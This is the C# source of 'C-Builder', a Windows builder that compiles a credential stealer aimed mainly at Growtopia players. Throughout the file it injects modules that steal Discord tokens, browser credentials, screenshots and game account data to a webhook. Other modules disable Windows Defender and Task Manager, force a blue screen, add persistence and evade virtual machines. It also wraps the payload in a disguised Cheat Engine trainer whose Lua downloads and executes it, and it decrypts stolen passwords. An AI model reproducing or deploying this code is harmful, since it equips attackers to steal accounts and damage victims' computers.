using C_Builder.Properties;
using Microsoft.Win32;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using AnonFileAPI;

namespace C_Builder
{
	public partial class Builder : MetroFramework.Forms.MetroForm
	{
		public static bool isObfuscated;
		string IcoFilePath { get; set; }
		List<string> alldata { get; set; }

		string key = "kljsdooqlo4454GG";
		static string temp = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Temp\\";

		public Builder()
		{
			WebClient wc = new WebClient();

			InitializeComponent();

			string announcements = wc.DownloadString("http://c-builder.000webhostapp.com/announcements.txt");
			newsTextBox.Text = announcements;

			savedatFolderPath.Text = ConfigurationManager.AppSettings["savefolderpath"];
		}

		private void buildButton_Click(object sender, EventArgs e)
		{
			if (disableManager.Checked || disableDefender.Checked || BSOD.Checked || siteBlocker.Checked && runAsAdmin.Checked != true)
			{
				runAsAdmin.Checked = true;
			}
			WebClient wc = new WebClient();
			string source = wc.DownloadString("http://c-builder.000webhostapp.com/code.txt");
			source = source.Replace("//webhook url", EncryptString(key, webhookUrl.Text));
			source = source.Replace("%Application%", metroTextBox3.Text);
			source = source.Replace("%Desc%", metroTextBox4.Text);
			source = source.Replace("%Company%", metroTextBox5.Text);
			source = source.Replace("%Copyright%", metroTextBox6.Text);

			if (grabToken.Checked)
			{
				source = source.Replace(@"""//dtoken""", @"""\nToken : "" + DiscordToken()");
			}
			else
			{
				source = source.Replace("//dtoken", string.Empty);
			}

			if (recoverDats.Checked)
			{
				source = source.Replace("//recover", "RecoverSaveDats();");
			}

			if (grabScreenshot.Checked)
			{
				source = source.Replace("//screenshot", @"if (File.Exists(screenshot))
                webHook.AddAttachment(screenshot, Environment.UserName + "" screenshot.png"");");
			}
			if (stealCreds.Checked)
			{
				source = source.Replace("//browsercreds", @"
                if (File.Exists(browsercredpath))
                {
				    webHook.AddAttachment(browsercredpath, Environment.UserName + "" credentials.txt"");
                }");
			}
			if (deleteGrowtopia.Checked)
			{
				source = source.Replace("//deletegt", @"try
				{
                    if (File.Exists(""C:\\Users\\"" + Environment.UserName + ""\\AppData\\Local\\Growtopia""));
                    {
                        Directory.Delete(""C:\\Users\\"" + Environment.UserName + ""\\AppData\\Local\\Growtopia"", true);
                    }
                }
                catch
                {
                }");
			}
			if (addStartup.Checked)
			{
				source = source.Replace("//startupxd", @"
                RegistryKey RK = Registry.CurrentUser.OpenSubKey(""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"", true);
				RK.SetValue(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName, Application.ExecutablePath);");
			}
			if (hideStealer.Checked)
			{
				source = source.Replace("//hidestealergobrrr", @"try 
                {
                    File.SetAttributes(Application.ExecutablePath, File.GetAttributes(Application.ExecutablePath) | FileAttributes.Hidden);
                }
                catch
                {
                }");
			}

			if (fakeError.Checked)
			{
				source = source.Replace("//errormessage", @"MessageBox.Show(""//msg"", ""Error"", MessageBoxButtons.OK, MessageBoxIcon.Error);");
				source = source.Replace("//msg", fakeErrorMsg.Text);
			}

			if (BSOD.Checked)
			{
				source = source.Replace("//BSOD", @"bool flag;
			    LMAOOOOOOOOOOOOOOO.RtlAdjustPrivilege(19, true, false, out flag);
			    uint num;
			    LMAOOOOOOOOOOOOOOO.NtRaiseHardError(3221225506U, 0U, 0U, IntPtr.Zero, 6U, out num);");
			}

			if (traceSavedat.Checked)
			{
				source = source.Replace("//tracer", "Tracer.OnChanged();");
			}

			if (disableManager.Checked)
			{
				source = source.Replace("//disablemanager", @"try
                {
                    RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(""Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"");
                    objRegistryKey.SetValue(""DisableTaskMgr"", 1);
                    objRegistryKey.Close();
                }
                catch
                {
                }");
			}

			if (disableDefender.Checked)
			{
				source = source.Replace("//diswin", @"if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)) return;

		        RegistryEdit(""SOFTWARE\\Microsoft\\Windows Defender\\Features"", ""TamperProtection"", ""0""); //Windows 10 1903 Redstone 6

                RegistryEdit(""SOFTWARE\\Policies\\Microsoft\\Windows Defender"", ""DisableAntiSpyware"", ""1"");
                RegistryEdit(""SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"", ""DisableBehaviorMonitoring"", ""1"");
                RegistryEdit(""SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"", ""DisableOnAccessProtection"", ""1"");
                RegistryEdit(""SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"", ""DisableScanOnRealtimeEnable"", ""1"");");
			}

			if (corruptGt.Checked)
			{
				source = source.Replace("//corruptgt", @"try
                {
                    string gt = ""C:\\Users\\"" + Environment.UserName + ""\\AppData\\Local\\Growtopia\\"";
                    File.Delete(gt + ""zlibwapi.dll"");
                }
                catch{}");
			}

			if (siteOpenerCheck.Checked)
			{
				source = source.Replace("//siteopener", siteOpener.Text);
			}
			else
			{
				source = source.Replace(@"Process.Start(""//siteopener"");", "");
			}

			if (siteBlocker.Checked)
			{
				source = source.Replace("//siteblocker", @"using (StreamWriter siteblocker = new StreamWriter(""C:\\Windows\\System32\\drivers\\etc\\hosts""))
                {
                    siteblocker.WriteLine(""127.0.0.1 "" + ""//siteblockertext"");
                }");
				source = source.Replace("//siteblockertext", siteBlockerText.Text);
			}

			if (embedMsg.Checked)
			{
				source = source.Replace("//embed1", "```");
				source = source.Replace("//embed", "```asciidoc");
			}
			else
			{
				source = source.Replace(@"+ ""//embed1""", string.Empty);
				source = source.Replace(@"""//embed"" + ", string.Empty);
			}

			source = source.Replace("//detectvm", @"
			bool isVM = DetectVirtualMachine();
			if (isVM == true)
			{
				Environment.Exit(1);
			}");

			#region Renamer
			source = source.Replace("EncryptString", "XD");
			source = source.Replace("RegistryEdit", "XDD");
			source = source.Replace("CheckDefender", "XDDD");
			source = source.Replace("RunPS", "XDDDD");
			source = source.Replace("PasteStealer", "XDDDDD");
			source = source.Replace("RetrievePass", "XDDDDDD");
			source = source.Replace("GrabIP", "XDDDDDDD");
			source = source.Replace("DecryptString", "XDDDDDDDD");
			source = source.Replace("dWebHook", "XDDDDDDDDD");
			source = source.Replace("Tracer", "XDDDDDDDDDD");
			source = source.Replace("GuidClass", "XDDDDDDDDDDD");
			source = source.Replace("strchange19", "XDDDDDDDDDDDD");
			source = source.Replace("strchange63", "XDDDDDDDDDDDDD");
			source = source.Replace("Get5RND", "XDDDDDDDDDDDDDD");
			source = source.Replace("Get9RND", "XDDDDDDDDDDDDDDD");
			source = source.Replace("replacestrg", "XDDDDDDDDDDDDDDDD");
			source = source.Replace("rand9list", "XDDDDDDDDDDDDDDDDD");
			source = source.Replace("rand5list", "LMAO");
			source = source.Replace("regCode", "LMAOO");
			source = source.Replace("GrabMGuID", "LMAOOO");
			source = source.Replace("SendMessage", "LMAOOOO");
			source = source.Replace("LMAOOOOWithAttachment", "LMAOOOOO");
			source = source.Replace("AddAttachment", "LMAOOOOOO");
			source = source.Replace("growid", "LMAOOOOOOO");
			source = source.Replace("passwords", "LMAOOOOOOOO");
			source = source.Replace("lastworld", "LMAOOOOOOOOO");
			source = source.Replace("OnChanged", "LMAOOOOOOOOOO");
			source = source.Replace("CheckChanged", "LMAOOOOOOOOOO");
			source = source.Replace("WebHook", "LMAOOOOOOOOOOO");
			source = source.Replace("savedatPath", "LMAOOOOOOOOOOOO");
			source = source.Replace("gtPath", "LMAOOOOOOOOOOOOO");
			source = source.Replace("DetectVirtualMachine", "LMAOXD");
			source = source.Replace("DiscordToken", "LMAOXDD");
			source = source.Replace("dotldb", "LMAOXDDD");
			source = source.Replace("tokenx", "LMAODXDDDD");
			source = source.Replace("dotlog", "LMAODXDDDDD");
			source = source.Replace("ReadLogFile", "LMAODXDDDDD");
			#endregion

			if (!String.IsNullOrEmpty(webhookUrl.Text))
			{
				SaveFileDialog sfd = new SaveFileDialog();
				sfd.FileName = "Stealer.exe";
				sfd.Filter = "Exe files (*.exe)|*.exe";
				if (sfd.ShowDialog() == DialogResult.OK)
				{
					Compiler(source, sfd.FileName);
				}
			}
			else
			{
				MessageBox.Show("Webhook URL can't be empty :/",
				"Warning",
				MessageBoxButtons.OK,
				MessageBoxIcon.Error);
			}

			void Compiler(string sourceCode, string savePath)
			{
				try
				{
					string[] referencedAssemblies = new string[] { "System.dll", "System.Windows.Forms.dll", "System.Net.dll", "System.Drawing.dll", "System.Management.dll", "System.IO.dll", "System.IO.compression.dll", "System.IO.compression.filesystem.dll", "System.Core.dll", "System.Security.dll", "System.Net.Http.dll" };

					Dictionary<string, string> providerOptions = new Dictionary<string, string>() { { "CompilerVersion", "v4.0" } };

					string manifestdec = @"<?xml version=""1.0"" encoding=""utf-8""?>
<assembly manifestVersion=""1.0"" xmlns=""urn:schemas-microsoft-com:asm.v1"">
  <assemblyIdentity version=""1.0.0.0"" name=""MyApplication.app""/>
  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2"">
    <security>
      <requestedPrivileges xmlns=""urn:schemas-microsoft-com:asm.v3"">
        <requestedExecutionLevel level=""highestAvailable"" uiAccess=""false"" />
      </requestedPrivileges>
    </security>
  </trustInfo>

  <compatibility xmlns=""urn:schemas-microsoft-com:compatibility.v1"">
    <application>
    </application>
  </compatibility>
</assembly>
";
					File.WriteAllText(Application.StartupPath + @"\manifest.manifest", manifestdec);
					CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
					CompilerParameters compars = new CompilerParameters();
					compars.ReferencedAssemblies.Add("System.Net.dll");
					compars.ReferencedAssemblies.Add("System.Net.Http.dll");
					compars.ReferencedAssemblies.Add("System.dll");
					compars.ReferencedAssemblies.Add("System.Windows.Forms.dll");
					compars.ReferencedAssemblies.Add("System.Drawing.dll");
					compars.ReferencedAssemblies.Add("System.Management.dll");
					compars.ReferencedAssemblies.Add("System.IO.dll");
					compars.ReferencedAssemblies.Add("System.IO.compression.dll");
					compars.ReferencedAssemblies.Add("System.IO.compression.filesystem.dll");
					compars.ReferencedAssemblies.Add("System.Core.dll");
					compars.ReferencedAssemblies.Add("System.Security.dll");
					compars.ReferencedAssemblies.Add("System.Diagnostics.Process.dll");
					compars.GenerateExecutable = true;
					string TempEXEPath = Path.GetTempPath() + "\\Application.exe";
					compars.OutputAssembly = TempEXEPath;
					compars.GenerateInMemory = false;
					compars.TreatWarningsAsErrors = false;
					compars.CompilerOptions += "/t:winexe /unsafe /platform:x86";

					if (!string.IsNullOrEmpty(metroTextBox1.Text) || !string.IsNullOrWhiteSpace(metroTextBox1.Text) && metroTextBox1.Text.Contains(@"\") && metroTextBox1.Text.Contains(@":") && metroTextBox1.Text.Length >= 7)
					{
						compars.CompilerOptions += " /win32icon:" + @"""" + metroTextBox1.Text + @"""";
					}
					else if (string.IsNullOrEmpty(metroTextBox1.Text) || string.IsNullOrWhiteSpace(metroTextBox1.Text))
					{

					}

					if (runAsAdmin.Checked)
					{
						compars.CompilerOptions += " /win32manifest:" + @"""" + Application.StartupPath + @"\manifest.manifest" + @"""";
					}

					CompilerResults compilerResults = provider.CompileAssemblyFromSource(compars, sourceCode); // source.cs

					if (filePumper.Checked)
					{
						try
						{
							Pumpexe(int.Parse(metroTextBox7.Text), savePath);
						}
						catch
						{
							MessageBox.Show("You need to use numbers in the file pumper.", "C-Builder",
							MessageBoxButtons.OK,
							MessageBoxIcon.Error
							);
							return;
						}
					}

					try
					{
						File.Delete(Application.StartupPath + @"\manifest.manifest");
					}
					catch { }

					try
					{
						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.WorkingDirectory = Path.GetDirectoryName(System.Reflection.Assembly.GetEntryAssembly().Location);
						p.StartInfo.Arguments = "/C Obfuscator.exe " + TempEXEPath + " " + savePath;
						p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						p.Start();
						p.WaitForExit();

						if (File.Exists(TempEXEPath))
							File.Delete(TempEXEPath);

						if (cetrainerExtension.Checked)
						{
							using (AnonFileWrapper anonFileWrapper = new AnonFileWrapper())
							{
								if (File.Exists(savePath))
								{
									AnonFile anonFile = anonFileWrapper.UploadFile(savePath);
									string DownloadPath = anonFileWrapper.GetDirectDownloadLinkFromLink(anonFile.FullUrl);
									string CetrainerCode = "function lolxdxd(xdxd)local xdlol = (5*3-2/8+9*2/9+8*3) end function lolxdxd(lollmaoo)local xdlol = (5*3-2/8+9*2/9+8*3) end local xdlolxd = (5*3-2/8+9*2/9+8*3) local url = '" + DownloadPath + "'local a= getInternet()local test = a.getURL(url)local location = os.getenv('TEMP')local file = io.open(location..'\\\\setfont.exe', 'wb')file:write(test)file:close()shellExecute(location..'\\\\setfont.exe')";
									string path2 = Path.GetDirectoryName(savePath) + "\\" + Path.GetFileNameWithoutExtension(savePath) + ".CETRAINER";
									File.WriteAllText(path2, "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<CheatTable CheatEngineTableVersion=\"29\">\n  <CheatEntries/>\n  <UserdefinedSymbols/>\n  <LuaScript>\n" + CetrainerCode + "\n</LuaScript>\n</CheatTable>");
								}
							}
							if (File.Exists(savePath))
								File.Delete(savePath);
						}

						MessageBox.Show("Stealer succesfully compiled!", "C-Builder",
							MessageBoxButtons.OK,
							MessageBoxIcon.Information);
					}
					catch (Exception ex)
					{
						File.Delete(TempEXEPath);
						File.Delete(savePath);
						MessageBox.Show(ex.ToString());
					}

					if (compilerResults.Errors.Count > 0)
					{
						foreach (CompilerError compilerError in compilerResults.Errors)
						{
							MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
								compilerError.Line, compilerError.Column, compilerError.FileName));
							File.Delete(Application.StartupPath + @"\manifest.manifest");
						}
					}
					else
					{
						File.Delete(Application.StartupPath + @"\manifest.manifest");
					}
					return;
				}
				catch (Exception ex)
				{
					MessageBox.Show(ex.ToString());
				}
			}
		}

		private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Process.Start("https://www.youtube.com/channel/UCVdIkguy3Iv2UJ_Go5rrPJw/");
		}

		private void Form1_Load(object sender, EventArgs e)
		{
			Decoder.SelectTab(metroTabPage1);
		}

		public static string EncryptString(string key, string plainText)
		{
			byte[] iv = new byte[16];
			byte[] array;

			using (Aes aes = Aes.Create())
			{
				aes.Key = Encoding.UTF8.GetBytes(key);
				aes.IV = iv;

				ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, encryptor, CryptoStreamMode.Write))
					{
						using (StreamWriter streamWriter = new StreamWriter((Stream)cryptoStream))
						{
							streamWriter.Write(plainText);
						}

						array = memoryStream.ToArray();
					}
				}
			}

			return Convert.ToBase64String(array);
		}

		public static string DecryptString(string key, string cipherText)
		{
			byte[] iv = new byte[16];
			byte[] buffer = Convert.FromBase64String(cipherText);

			using (Aes aes = Aes.Create())
			{
				aes.Key = Encoding.UTF8.GetBytes(key);
				aes.IV = iv;
				ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

				using (MemoryStream memoryStream = new MemoryStream(buffer))
				{
					using (CryptoStream cryptoStream = new CryptoStream((Stream)memoryStream, decryptor, CryptoStreamMode.Read))
					{
						using (StreamReader streamReader = new StreamReader((Stream)cryptoStream))
						{
							return streamReader.ReadToEnd();
						}
					}
				}
			}
		}

		private void fakeError_CheckedChanged(object sender, EventArgs e)
		{
			if (fakeError.Checked)
			{
				fakeErrorMsg.Enabled = true;
			}
			else
			{
				fakeErrorMsg.Enabled = false;
			}
		}

		private void metroCheckBox1_CheckedChanged(object sender, EventArgs e)
		{
			if (metroCheckBox1.Checked != true)
			{
				metroCheckBox1.Checked = true;
			}
		}

		private void BSOD_CheckedChanged(object sender, EventArgs e)
		{
			if (BSOD.Checked)
			{
				runAsAdmin.Checked = true;
			}
			else
			{
				runAsAdmin.Checked = false;
			}
		}

		private void traceSavedat_CheckedChanged(object sender, EventArgs e)
		{

		}

		private void disableManager_CheckedChanged(object sender, EventArgs e)
		{
			if (disableManager.Checked)
			{
				runAsAdmin.Checked = true;
			}
			else
			{
				runAsAdmin.Checked = false;
			}
		}

		private void disableDefender_CheckedChanged(object sender, EventArgs e)
		{
			if (disableDefender.Checked)
			{
				runAsAdmin.Checked = true;
			}
			else
			{
				runAsAdmin.Checked = false;
			}
		}

		private void siteOpenerCheck_CheckedChanged(object sender, EventArgs e)
		{
			if (siteOpenerCheck.Checked)
			{
				siteOpener.Enabled = true;
			}
			else
			{
				siteOpener.Enabled = false;
			}
		}

		private void siteBlockerCheck_CheckedChanged(object sender, EventArgs e)
		{
			if (siteBlocker.Checked)
			{
				runAsAdmin.Checked = true;
				siteBlockerText.Enabled = true;
			}
			else
			{
				runAsAdmin.Checked = false;
				siteBlockerText.Enabled = false;
			}
		}

		private void selectFolder_Click(object sender, EventArgs e)
		{
			FolderBrowserDialog folderDlg = new FolderBrowserDialog();
			folderDlg.ShowNewFolderButton = true;
			DialogResult result = folderDlg.ShowDialog();
			if (result == DialogResult.OK)
			{
				string savefolderpath = folderDlg.SelectedPath;
				savedatFolderPath.Clear();
				savedatFolderPath.AppendText(savefolderpath);
				Program.setSetting("savefolderpath", savedatFolderPath.Text);
			}
		}
		public List<string> DecodeDats()
		{
			try
			{
				List<string> alldata = new List<string>();
				saveDatList.Items.Clear();
				string savefolderpath = ConfigurationManager.AppSettings["savefolderpath"];
				string[] allsaves = Directory.GetFiles(savefolderpath, "*.cbuilder");
				foreach (string i in allsaves)
				{
					string savedata = null;
					var r = File.Open(i, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					using (FileStream fileStream = new FileStream(i, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
					{
						using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
						{
							savedata = streamReader.ReadToEnd();
						}
					}
					string[] data = savedata.Split(new char[]
					{
						'|'
					});
					string Growid = data[0];
					string pass = data[1];
					string lastworld = data[2];

					string accdata = DecryptString(key, Growid) + "|" + DecryptString(key, pass) + "|" + DecryptString(key, lastworld);
					alldata.Add(accdata);
					saveDatList.Items.Add(DecryptString(key, Growid));
				}
				return alldata;
			}
			catch
			{
				return null;
			}
		}

		private void refreshDats_Click(object sender, EventArgs e)
		{
			alldata = DecodeDats();
		}

		private void saveDatList_SelectedIndexChanged(object sender, EventArgs e)
		{
			growid.Clear();
			passwords.Clear();
			lastWorld.Clear();

			string curGrowID = saveDatList.SelectedItem.ToString();
			growid.Text = curGrowID;
			string rawresult = alldata.FirstOrDefault(alldata => alldata.Contains(curGrowID));
			string[] result = rawresult.Split(new char[]
			{
				'|'
			});
			string pass1 = result[1];
			string lastworld1 = result[2];

			passwords.Text = pass1;
			lastWorld.Text = lastworld1;
		}

		private void iconChanger_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				OpenFileDialog dialog = new OpenFileDialog();
				dialog.Filter = "Ico files (*ico)|*.ico";
				dialog.Title = "Select an ico file";
				DialogResult result = dialog.ShowDialog();
				if (result == DialogResult.OK)
				{
					pictureBox1.Load(dialog.FileName);
					pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
					IcoFilePath = dialog.FileName;
					metroTextBox1.Clear();
					metroTextBox1.Text = IcoFilePath;
				}
			}
		}
		void Pumpexe(decimal size, string path)
		{
			FileStream file = File.OpenWrite(path);
			long ende = file.Seek(0, SeekOrigin.End);

			decimal groesse = size * 1048576;

			while (ende < groesse)
			{
				ende++;

				file.WriteByte(0);
			}
			file.Close();
		}
		private void metroButton1_Click_1(object sender, EventArgs e)
		{
		}

		private void metroButton4_Click(object sender, EventArgs e)
		{
			using (SaveFileDialog sfd = new SaveFileDialog())
			{
				// save yout binded files
				sfd.Title = "Save your binded files !";
				sfd.Filter = "Executables *.exe|*.exe";
				sfd.RestoreDirectory = true;
				sfd.FileName = "Stealer.binded.exe";

				if (sfd.ShowDialog() == DialogResult.OK)
				{
					//Make a string that save the location of your file.
					string Allpossibilities = "";
					//new ResourceWriter
					using (ResourceWriter write = new ResourceWriter("files.resources"))
					{
						//For every file location in the listbox,
						foreach (object filetobind in ListofFileToBIND.Items)
						{


							string Resourcenam = RndString(10);

							string Source = Properties.Resources.Possibility.Replace("{ressources}", Resourcenam); //replace by a random string

							write.AddResource(Resourcenam, File.ReadAllBytes((string)filetobind)); //add to the ressources file.

							Source = Source.Replace("{filname}", RndString(10) + ".exe"); // we have a renamed file

							Allpossibilities += Source;
						}
					}

					string ToCompile = Properties.Resources.FileToEXE.Replace("[DROPCODE]", Allpossibilities);
					//Compile it with our class.
					CompileToSingleEXE.CompileFromSource(ToCompile, sfd.FileName);
					//Delete the files ressources.
					File.Delete("files.resources");
					MessageBox.Show("Files successfuly binded! : " + sfd.FileName, "C-Builder",
						MessageBoxButtons.OK,
						MessageBoxIcon.Information
						); //Success
				}
			}
		}
		private Random r = new Random();
		private string RndString(int Length)
		{
			string Allowed = "azertyuiopqsdfghjklQWERTYUIOPASDFGHJKLZXCVBNM";

			string randomm = "";

			for (int i = 0; i < Length; i++) randomm += Allowed[r.Next(0, Allowed.Length)];

			return randomm;
		}

		private void metroButton3_Click(object sender, EventArgs e)
		{
			ListofFileToBIND.Items.Remove(ListofFileToBIND.SelectedItem);
		}

		private void metroButton2_Click_1(object sender, EventArgs e)
		{
			// Search your .exe
			OpenFileDialog d = new OpenFileDialog();
			// add to the listbox
			d.Filter = "*.exe | *.exe";
			if (d.ShowDialog() == DialogResult.OK) ListofFileToBIND.Items.Add(d.FileName);
		}

		private void Form1_FormClosed(object sender, FormClosedEventArgs e)
		{
			Environment.Exit(1);
		}

		private void metroButton5_Click(object sender, EventArgs e)
		{
		}

		private void metroTabPage5_Click(object sender, EventArgs e)
		{

		}

		private void Login_Load(object sender, EventArgs e)
		{

		}

		private void metroButton5_Click_1(object sender, EventArgs e)
		{
		}

		private void corruptGt_CheckedChanged(object sender, EventArgs e)
		{

		}

		private void antiVM_CheckedChanged(object sender, EventArgs e)
		{
		}

		private void filePumper_CheckedChanged(object sender, EventArgs e)
		{
			if (filePumper.Checked)
			{
				metroTextBox7.Enabled = true;
			}
			else
			{
				metroTextBox7.Enabled = false;
			}
		}
	}
}
